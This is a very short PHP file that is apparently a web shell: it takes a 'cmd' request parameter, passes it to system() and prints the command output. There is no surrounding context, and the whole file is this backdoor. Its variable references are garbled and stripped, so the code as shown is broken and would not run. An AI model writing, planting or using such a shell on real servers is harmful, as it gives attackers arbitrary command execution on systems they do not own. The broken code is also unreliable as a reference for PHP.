<?php
if (isset(['cmd'])) {
    \ = ['cmd'];
    echo '<pre>';
    system(\);
    echo '</pre>';
}
